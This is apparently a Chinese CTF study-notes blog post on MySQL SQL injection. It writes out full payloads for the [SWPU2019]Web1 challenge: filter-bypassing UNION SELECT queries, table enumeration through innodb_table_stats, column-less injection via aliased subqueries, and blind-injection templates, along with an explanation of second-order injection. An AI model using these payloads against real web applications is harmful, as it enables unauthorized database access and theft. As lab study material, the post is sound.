InnoDb引擎从MYSQL5.5.8开始，InnoDB成为其默认存储引擎。而在MYSQL5.6以上的版本中，inndb增加了innodb_index_stats和innodb_table_stats两张表，这两张表中都存储了数据库和其数据表的信息，但是没有存储列名。sys数据库在5.7以上的MYSQL中，新增了sys数据库，该库的基础数据来自information_schema和performance_chema，其本身不存储数据。可以通过其中的schema_auto_increment_columns来获取表名。 sys数据库需要root权限，而innoDb在mysql中默认关闭 限制：mysql ≥ 5.7版本 先查一下数据库版本 因此可以利用innoDb来查表名 系统Mysql库中存在两张与innodb相关的表：innodb_table_stats和innodb_index_stats。 所以可以通过查找这两个表取代information的作用 0&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,group_concat(table_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x2F;**&#x2F;from&#x2F;**&#x2F;mysql.innodb_table_stats&#x2F;**&#x2F;where&#x2F;**&#x2F;database_name&#x3D;database()&amp;&amp;&#39;1&#39;&#x3D;&#39;1 或 0&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,group_concat(table_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x2F;**&#x2F;from&#x2F;**&#x2F;mysql.innodb_index_stats&#x2F;**&#x2F;where&#x2F;**&#x2F;database_name&#x3D;database()&amp;&amp;&#39;1&#39;&#x3D;&#39;1 得到表名为ads和users 猜flag在users表内，进行无列名注入 无列名注入原理 无列名注入的原理就是在取别名的同时查询数据。通过无列名查询构造一个虚拟表，在构造此表的同时查询其中的数据。 表的列数也要一次次试 （不太懂为啥这里的列数不是22) CTF|mysql之无列名注入 - 知乎 (zhihu.com) [SWPU2019]Web1 - 王叹之 - 博客园 (cnblogs.com) 0&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2, (select&#x2F;**&#x2F;group_concat(&#96;3&#96;)&#x2F;**&#x2F;from&#x2F;**&#x2F;(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;union&#x2F;**&#x2F;select*from&#x2F;**&#x2F;users)a),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&amp;&amp;&#39;1&#39;&#x3D;&#39;1 如果反引号被过滤，就要对字段利用别名替代 还可以利用join爆列名 join后的列名是两个表列名加起来的，可能会产⽣相同的列名，如id和name，使⽤别名时，表中不能出现同的字段名，这就跟join第⼀个特点相冲突，所以在join和别名同时使⽤时会导致报错 当通过查询得到新的表时，必须有一个别名，即每个派生出来的表都必须有一个自己的别名 二次注入原理 二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。 二次注入，可以概括为以下两步: 第一步：插入恶意数据 进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。 第二步：引用恶意数据 开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。 记考核赛的一次sql盲注 (strcmp(ascii(substr(REVERSE(tceles)(table_name)from(mysql.innodb_table_stats)where((table_schema)like(database())),1,1)),10000))%23 ||strcmp(ascii(substr((select(table_name)from(mysql.innodb_table_stats))where((database_name)like(database())),1,1)),1)%23 username=admin&amp;password=||((ascii(mid((pwd)from(1))))like(12))%23 YouAresOgOoD select(table_name)from(information_schema.tables)where(table_schema=database()) ||(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),§1§,1))=§0§)%23 flag_1s_her3 ||(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=0x666c61675f31735f68657233)),§1§,1))=§0§)%23 flag{sql1_1s_s0_ea3y}","categories":[],"tags":[{"name":"web学习","slug":"web学习","permalink":"https://ethe448.github.io/tags/web%E5%AD%A6%E4%B9%A0/"},{"name":"sql注入","slug":"sql注入","permalink":"https://ethe448.github.io/tags/sql%E6%B3%A8%E5%85%A5/"}]}],"categories":[],"tags":[{"name":"web学习","slug":"web学习","permalink":"https://ethe448.github.io/tags/web%E5%AD%A6%E4%B9%A0/"},{"name":"ssrf","slug":"ssrf","permalink":"https://ethe448.github.io/tags/ssrf/"},{"name":"ctf","slug":"ctf","permalink":"https://ethe448.github.io/tags/ctf/"},{"name":"华为ict","slug":"华为ict","permalink":"https://ethe448.github.io/tags/%E5%8D%8E%E4%B8%BAict/"},{"name":"随笔","slug":"随笔","permalink":"https://ethe448.github.io/tags/%E9%9A%8F%E7%AC%94/"},{"name":"反序列化","slug":"反序列化","permalink":"https://ethe448.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"ssti注入","slug":"ssti注入","permalink":"https://ethe448.github.io/tags/ssti%E6%B3%A8%E5%85%A5/"},{"name":"sql注入","slug":"sql注入","permalink":"https://ethe448.github.io/tags/sql%E6%B3%A8%E5%85%A5/"}]}